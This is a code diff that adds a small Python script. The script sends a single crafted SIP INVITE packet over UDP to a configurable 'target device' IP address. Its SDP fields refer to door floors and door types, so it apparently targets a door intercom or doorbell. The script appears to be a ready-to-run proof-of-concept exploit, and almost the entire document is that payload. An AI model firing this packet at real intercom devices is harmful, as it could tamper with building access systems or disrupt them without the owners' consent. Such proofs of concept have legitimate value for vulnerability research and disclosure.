@@ -1,0 +1,11 @@
+import socket
+
+UDP_IP = "192.0.0.30" #change me - target device IP address
+UDP_PORT = 5060
+
+MESSAGE = 'INVITE sip:10000000000@192.0.0.1:5065 SIP/2.0\r\nVia: SIP/2.0/UDP 192.0.0.1:5065;branch=AAAAAAAAAAAAAAAA\r\nVia: SIP/2.0/UDP 192.0.0.1:5060;rport;branch=AAAAAAAAAAAAAAAA\r\nFrom: <sip:10000000000@192.0.0.1>;tag=000000000\r\nTo: <sip:10000000000@192.0.0.1:5065>\r\nCall-ID: 000000000\r\nCSeq: 20 INVITE\r\nContact: <sip:10000000000@192.0.0.1:5060>\r\nContent-Type: application/sdp\r\nMax-Forwards: 69\r\nUser-Agent: eXosip/3.6.0\r\nSubject: This is a call for conversation\r\nContent-Length:   148\r\n\r\nv=0\r\no=220152004 0 0 IN IP4 192.0.0.1\r\ns=Talk session\r\nc=IN IP4 192.0.0.1\r\nt=0 0\r\na=doorFloor:0\r\na=responseType:0\r\na=doorType:0\r\na=isSpecialType:0\r\n'
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.connect((UDP_IP, UDP_PORT))
+s.sendall(MESSAGE.encode())
+s.close()
